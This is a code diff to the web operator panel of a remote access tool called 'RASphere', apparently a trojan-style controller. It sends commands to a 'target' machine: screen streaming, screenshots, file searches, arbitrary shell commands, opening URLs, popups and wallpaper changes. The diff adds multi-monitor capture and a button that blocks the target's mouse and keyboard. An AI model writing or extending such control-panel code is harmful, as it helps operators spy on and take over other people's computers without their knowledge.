@@ -251,6 +251,10 @@
             <select id="scale-select" onchange="setScale()">
                 <option value="0.3">30%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1.0">100%</option>
             </select>
+            <label>Monitor:</label>
+            <select id="monitor-select" onchange="setMonitor()">
+                <option value="1">Screen 1</option><option value="2">Screen 2</option><option value="3">Screen 3</option>
+            </select>
             <button class="btn-sm" id="track-btn" onclick="toggleCursorTracking()">👆 Track Off</button>
             <span style="color:var(--text-muted);font-size:11px;" id="fps-display">FPS: --</span>
             <span class="spacer" style="flex:1;"></span>
@@ -284,7 +288,7 @@
     <!-- FUN COMMANDS -->
     <div id="fun-panel" class="panel">
         <div style="padding:16px;overflow-y:auto;flex:1;display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;">
-            <div class="stat-card"><div class="stat-title">🖼 Wallpaper</div><input id="wp-path" placeholder="Image path on target" style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('wallpaper_set',{path:document.getElementById('wp-path').value})" style="width:100%;">Apply</button></div>
+            <div class="stat-card"><div class="stat-title">🖼️ Wallpaper</div><input id="wp-path" placeholder="Local path or https://..." style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('wallpaper_set',{path:document.getElementById('wp-path').value})" style="width:100%;">Apply</button></div>
             <div class="stat-card"><div class="stat-title">💬 Popup</div><input id="mb-title" placeholder="Title" value="RASphere" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><input id="mb-text" placeholder="Message" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('msgbox_show',{title:document.getElementById('mb-title').value,text:document.getElementById('mb-text').value})" style="width:100%;">Show</button></div>
             <div class="stat-card"><div class="stat-title">🌐 Open URL</div><input id="url-inp" placeholder="https://..." style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('open_url',{url:document.getElementById('url-inp').value})" style="width:100%;">Open</button></div>
             <div class="stat-card"><div class="stat-title">📸 Screenshot</div><button class="btn-sm" onclick="emitToClient('take_screenshot')" style="width:100%;margin:6px 0;">Take Now</button><div id="ss-preview" style="max-height:120px;overflow:hidden;"></div></div>
@@ -293,6 +297,7 @@
             <div class="stat-card"><div class="stat-title">🔍 Search Files</div><input id="sr-root" value="C:\\" placeholder="Root" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><input id="sr-pat" placeholder="Pattern" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('search_files',{root:document.getElementById('sr-root').value,pattern:document.getElementById('sr-pat').value})" style="width:100%;">Search</button><div id="sr-result" style="font-size:11px;max-height:100px;overflow-y:auto;color:var(--text-secondary);"></div></div>
             <div class="stat-card"><div class="stat-title">⚡ Shell</div><input id="sh-cmd" placeholder="whoami" style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--accent-green);border-radius:4px;font-size:12px;font-family:var(--font-mono);"><button class="btn-sm" onclick="emitToClient('execute_command',{command:document.getElementById('sh-cmd').value})" style="width:100%;">Run</button><pre id="sh-out" style="font-size:11px;color:var(--accent-green);max-height:120px;overflow-y:auto;margin-top:6px;background:#0a0a0a;padding:6px;border-radius:4px;font-family:var(--font-mono);white-space:pre-wrap;"></pre></div>
             <div class="stat-card"><div class="stat-title">🔊 Sound</div><button class="btn-sm" onclick="emitToClient('play_sound',{freq:800,dur:1})" style="width:100%;margin:6px 0;">Beep</button><button class="btn-sm" onclick="emitToClient('play_sound',{freq:1200,dur:2})" style="width:100%;">Long Beep</button></div>
+            <div class="stat-card"><div class="stat-title">🔒 Input Block</div><p style="font-size:11px;color:var(--text-muted);margin:6px 0;">Block mouse & keyboard (needs admin)</p><button class="btn-sm" onclick="emitToClient('input_block')" style="width:100%;margin:4px 0;border-color:var(--accent-red);color:var(--accent-red);">🔒 Block Input</button><button class="btn-sm" onclick="emitToClient('input_unblock')" style="width:100%;">🔓 Unblock Input</button></div>
         </div>
     </div>
 
@@ -500,6 +505,9 @@
         APP.socket.on('cmd_result', data => {
             showToast(`${data.cmd}: ${data.message}`, data.ok ? 'success' : 'error');
         });
+        APP.socket.on('power_result', data => {
+            showToast(`${data.action}: ${data.ok ? 'OK' : 'Failed'}`, data.ok ? 'success' : 'error');
+        });
         APP.socket.on('screenshot_result', data => {
             if (data.error) { showToast(data.error, 'error'); return; }
             const p = document.getElementById('ss-preview');
@@ -643,7 +651,7 @@
     // ─── Screen ─────────────────────────────────────────────────────
     function toggleScreenStream() {
         if (APP.streaming) { emitToClient('stop_screen_capture'); }
-        else { emitToClient('start_screen_capture', {monitor: 1}); APP.lastFrameTime = performance.now(); APP.frameCount = 0; APP.fpsHistory = []; }
+        else { emitToClient('start_screen_capture', {monitor: parseInt(document.getElementById('monitor-select').value) || 1}); APP.lastFrameTime = performance.now(); APP.frameCount = 0; APP.fpsHistory = []; }
     }
     function updateStreamButton() {
         const b = document.getElementById('stream-toggle-btn');
@@ -652,6 +660,7 @@
     }
     function setQuality() { emitToClient('set_screen_quality', {quality: parseInt(document.getElementById('quality-select').value)}); }
     function setScale() { emitToClient('set_screen_quality', {scale: parseFloat(document.getElementById('scale-select').value)}); }
+    function setMonitor() { emitToClient('set_screen_monitor', {monitor: parseInt(document.getElementById('monitor-select').value)}); }
     function toggleCursorTracking() {
         APP.cursorTracking = !APP.cursorTracking;
         const b = document.getElementById('track-btn');
